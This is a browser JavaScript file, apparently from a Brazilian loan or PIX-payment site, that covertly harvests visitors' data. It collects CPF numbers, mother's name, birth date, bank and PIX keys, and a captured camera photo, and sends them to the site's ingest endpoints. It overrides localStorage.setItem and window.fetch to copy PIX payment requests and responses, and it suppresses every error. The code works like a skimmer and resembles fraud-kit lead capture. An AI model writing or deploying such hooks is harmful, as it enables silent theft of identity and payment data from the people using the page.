(function () {
  const KEYS = [
    'nome', 'name', 'cpf', 'document', 'nome_mae', 'data_nasc', 'email',
    'telefone', 'telephone', 'phone', 'banco', 'tipo_pix', 'chave_pix',
    'selectedLoanAmount', 'selectedInstallments', 'selectedMonthlyPayment',
    'approvedAmount', 'utm_source', 'utm_medium', 'utm_campaign', 'utm_id',
    'utm_content', 'utm_term', 'sck', 'ttclid'
  ];

  function vid() {
    let id = localStorage.getItem('lead_vid');
    if (!id) {
      id = (crypto.randomUUID && crypto.randomUUID()) || ('v' + Date.now() + Math.random().toString(16).slice(2));
      localStorage.setItem('lead_vid', id);
    }
    return id;
  }

  function fields() {
    const data = {};
    KEYS.forEach((k) => {
      const v = localStorage.getItem(k);
      if (v) data[k] = v;
    });
    const params = new URLSearchParams(location.search);
    ['utm_source', 'utm_medium', 'utm_campaign', 'utm_id', 'sck', 'ttclid'].forEach((k) => {
      const v = params.get(k);
      if (v && !data[k]) data[k] = v;
    });
    return data;
  }

  function post(url, body) {
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      keepalive: true
    }).catch(function () {});
  }

  function sync(step) {
    post('/api/ingest/lead', {
      visitorId: vid(),
      step: step || location.pathname,
      fields: fields()
    });
  }

  function uploadPhoto(dataUrl) {
    if (!dataUrl || dataUrl.length < 40) return;
    const sent = sessionStorage.getItem('photo_sent');
    if (sent === String(dataUrl.length)) return;
    post('/api/ingest/photo', { visitorId: vid(), image: dataUrl }).then(function (res) {
      if (res && res.ok) sessionStorage.setItem('photo_sent', String(dataUrl.length));
    });
  }

  const origSet = localStorage.setItem.bind(localStorage);
  localStorage.setItem = function (k, v) {
    origSet(k, v);
    if (k === 'nbk_captured_photo') uploadPhoto(v);
    schedule();
  };

  let t;
  function schedule() {
    clearTimeout(t);
    t = setTimeout(function () { sync(); }, 400);
  }

  const origFetch = window.fetch.bind(window);
  window.fetch = function (input, init) {
    const p = origFetch(input, init);
    try {
      const url = String(typeof input === 'string' ? input : (input && input.url) || '');
      p.then(function (res) {
        const copy = res.clone();
        if (url.indexOf('/api/pix/create') !== -1) {
          copy.json().then(function (data) {
            post('/api/ingest/pix', {
              visitorId: vid(),
              type: 'create',
              page: location.pathname,
              request: init && init.body,
              response: data
            });
          }).catch(function () {});
        } else if (url.indexOf('/api/pix/status') !== -1) {
          copy.json().then(function (data) {
            if (!data) return;
            post('/api/ingest/pix', {
              visitorId: vid(),
              type: 'status',
              page: location.pathname,
              transactionId: data.transactionId || data.id,
              qrCode: data.qrCode,
              amount: data.amount,
              status: data.status,
              response: data
            });
          }).catch(function () {});
        }
      }).catch(function () {});
    } catch (e) {}
    return p;
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () {
      sync(location.pathname);
      const photo = localStorage.getItem('nbk_captured_photo');
      if (photo) uploadPhoto(photo);
    });
  } else {
    sync(location.pathname);
    const photo = localStorage.getItem('nbk_captured_photo');
    if (photo) uploadPhoto(photo);
  }
})();
